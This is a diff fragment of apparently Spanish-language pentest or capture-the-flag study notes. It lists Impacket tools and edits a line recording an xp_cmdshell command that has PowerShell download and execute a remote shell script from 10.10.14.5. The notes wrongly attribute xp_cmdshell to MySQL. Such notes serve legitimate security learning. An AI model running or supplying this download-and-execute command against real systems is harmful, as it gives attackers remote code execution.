@@ -305,5 +305,5 @@ APRENDIDO:
  "mssqlclient.py   "
  "psexec.py   "
  "Forma de injeccion de comandos despues de setear la configuracion de la opcion xp_cmdshell en Mysql     "
- "COMMANDO xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/shell.ps1\");"   "
+  xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/shell.ps1\");"   
 ```
